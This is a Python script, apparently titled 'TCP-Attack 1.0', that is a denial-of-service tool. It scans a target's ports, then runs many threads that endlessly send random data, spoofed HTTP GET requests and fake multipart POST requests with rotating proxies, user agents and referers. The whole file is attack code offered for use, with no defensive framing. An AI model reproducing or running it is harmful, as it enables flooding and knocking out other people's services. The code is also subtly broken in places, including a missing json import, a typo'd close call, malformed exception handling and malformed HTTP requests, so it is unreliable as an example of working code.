import socket,argparse,sys,os,pathlib,random,threading,itertools,base64,tcp_date
from urllib.parse import urlparse

class TCP:

    def __init__(self,target_url):
        self.target_url = target_url
        self.domain = urlparse(target_url).netloc
        self.host_ip = socket.gethostbyname(self.domain)
        self.cycle = itertools.cycle(r"/-\|")
        self.port_path,self.port_file = "port_date","port_"
        self.los_attack = 0
        self.proxy_date,self.ua_date,self.referer_date = tcp_date.Request().proxy_list_build(),tcp_date.Request().ua_list_build(),tcp_date.Request().referer_list_build()

        proxy_date = open(self.proxy_date,"r",encoding="utf-8").readlines()
        self.proxy_list = [proxy.strip("\n") for proxy in proxy_date]
        del self.proxy_list[0:3]

        ua_date = open(self.ua_date,"r",encoding="utf-8").readlines()
        self.ua_list = [ua.strip("\n") for ua in ua_date]

        referer_date = open(self.referer_date,"r",encoding="utf-8").readlines()
        self.referer_list = [referer.strip("\n") for referer in referer_date]
        del self.referer_list[18]

        self.send_path,self.send_file = "send_date","send_file.dat"

    def pip_install(self):

        os.system("pip install requests")
        os.system("pip install bs4")

    def send_date_file(self,send_int):

        pathlib.Path(self.send_path).mkdir(exist_ok=True)
        with open(f"{self.send_path}/{self.send_file}","wb+")as dat_file:
            dat_file.write(random._urandom(send_int))

        return f"{self.send_path}/{self.send_file}"

    def port_scan(self,start_port,end_port,list_port=[]):
        for port in range(start_port,end_port + 1):
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as s:
                open_port = s.connect_ex((self.host_ip,port))
                s.close()
                sys.stdout.write("\r")
                sys.stdout.write(f"Port_Scan >>> Target_Domain / [{self.domain}] -> [{port}] ~ {next(self.cycle)}")
                sys.stdout.flush()
                if open_port == 0:
                    list_port.append(port)
        pathlib.Path(self.port_path).mkdir(exist_ok=True)
        with open(f"{self.port_path}/{self.port_file}{self.domain}.json","w+",encoding="utf-8")as port_file:
            key = {"port_date":list_port}
            port_file.write(json.dumps(key))

        return f"{self.port_path}/{self.port_file}{self.domain}.json"

    def tcp_attack_1(self,port_path,send_int):
        port_file = open(port_path,"r",encoding="utf-8").read()
        port_date = json.loads(port_file)
        send_date = random._urandom(int(send_int))
        for port_text in port_date["port_date"]:
            if port_text == 80:
                port = 80
            else:
                port = random.choice(port_date["port_date"])
                
        
        try:
                with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as s:
                    s.connect((self.host_ip,port))
                    s.sendall(send_date)

        except ConnectionError or TimeoutError:
                s,close()
                self.los_attack += 1
                port = random.choice(port_date["port_date"])

        except BrokenPipeError:
                devnull = os.open(os.devnull, os.O_WRONLY)
                os.dup2(devnull, sys.stdout.fileno())
                sys.exit(1) 

    def tcp_attack_2(self,port_path):

        port_file = open(port_path,"r",encoding="utf-8").read()
        port_date = json.loads(port_file)
        for port_text in port_date["port_date"]:
            if port_text == 80:
                port = 80
            else:
                port = random.choice(port_date["port_date"])

        proxy = random.choice(self.proxy_list)
        ua = random.choice(self.ua_list)
        referer = random.choice(self.referer_list)

        
        try:
                request = f"""
                GET / {self.target_url} /HTTP1.1\r\n/
                Host : {proxy}\r\n/
                Connection : Keep-Alive\r\n/
                User-Agent : {ua}\r\n/
                Referer : {referer}\r\n
                """
                with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as s:
                    s.connect((self.host_ip,port))
                    s.sendall(request.encode())

        except ConnectionError or TimeoutError:
                s.close()
                self.los_attack += 1
                port = random.choice(port_date["port_date"])
                proxy = random.choice(self.proxy_list)
                ua = random.choice(self.ua_list)
                referer = random.choice(self.referer_list)


        except BrokenPipeError:
                devnull = os.open(os.devnull,os.O_WRONLY)
                os.dup2(devnull,sys.stdout.fileno())
                sys.exit(1)
    
    def tcp_attack_3(self,port_path,send_path):
        port_file = open(port_path,"r",encoding="utf-8").read()
        port_date = json.loads(port_file)
        for port_text in port_date["port_date"]:
            if port_text == 80:
                port = 80
            else:
                port = random.choice(port_date["port_date"])

        proxy = random.choice(self.proxy_list)
        ua = random.choice(self.ua_list)
        referer = random.choice(self.referer_list)
        send_file = open(send_path,"rb").read()
        send_base64 = base64.b64encode(send_file)
        boundary = "---------092109132121221"
        
        try:
                
                request = f"""
                POST / {self.target_url} /HTTP1.1\r\n/
                Host : {proxy}\r\n/
                Connection : Keep-Alive\r\n/
                Content-Length : {len(send_file)}\r\n/
                Content-Type : multipart/form-data;boundary={boundary}\r\n/\r\n/
                {boundary}\r\n/
                Content-Disposition : form-date; name="" :file_name={send_path}\r\n/
                Content-Type : text/plain\r\n/
                Content-Tranfer-Encoding : base64\r\n/
                {send_base64}\r\n/
                {boundary}\r\n/ 
                User-Agent : {ua}\r\n/
                Referer : {referer}\r\n/


                """
                with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as s:
                    s.connect((self.host_ip,port))
                    s.sendall(request.encode())

        except ConnectionError or TimeoutError:
                s.close()
                self.los_attack += 1
                port = random.choice(port_date["port_date"])
                proxy = random.choice(self.proxy_list)
                ua = random.choice(self.ua_list)
                referer = random.choice(self.referer_list)


        except BrokenPipeError:
                devnull = os.open(os.devnull,os.O_WRONLY)
                os.dup2(devnull,sys.stdout.fileno())
                sys.exit(1)

    def tcp_attack(self,target_url,port_path,send_int,send_path):

            tcp = TCP(target_url)
            
            proxy = random.choice(self.proxy_list)
            os.environ["http"] = f"http://{proxy}"
            os.environ["https"] = f"https://{proxy}"

            while True:
                sys.stdout.write("\r")
                sys.stdout.write(f"Attack >>> Target_Domain / [{self.domain}] / Los_Attack<{self.los_attack}> ~ {next(self.cycle)}")
                sys.stdout.flush()
                tcp.tcp_attack_1(port_path,send_int)
                tcp.tcp_attack_2(port_path)
                target=tcp.tcp_attack_3(port_path,send_path)
                
            

def main():
        user_message = """
        ~~~~~~~~~~~~~~~~~~
        <--TCP-Attack--> // (1.0)
        ~~~~~~~~~~~~~~~~~~
        """

        arg = argparse.ArgumentParser(description=user_message)

        arg.add_argument("-url",type=str,help="Target_URL / -url <target_url>")
        arg.add_argument("-send",type=int,help="Send_Date / -send <send_date>")
        arg.add_argument("-port",nargs=2,type=int,help="Port_Scan / -port <start_port> <end_port>")
        arg.add_argument("-task",type=int,help="Task_Date / -task <task_date>")
        
        parse = arg.parse_args()

        try:
            tcp = TCP(parse.url)

            send_path = tcp.send_date_file(parse.send)
            
            port_path = tcp.port_scan(int(parse.port[0]),int(parse.port[1]))

            for attack in range(int(parse.task)):

                th = threading.Thread(target=tcp.tcp_attack,args=(parse.url,port_path,int(parse.send),send_path,))
                th.start()

        except ModuleNotFoundError:
            tcp.pip_install()
            sys.exit(1)
        except KeyboardInterrupt:
            sys.stdout.write("\nStop_TCP_Attack...\n")
            sys.exit()
        
if __name__ == "__main__":
    main()
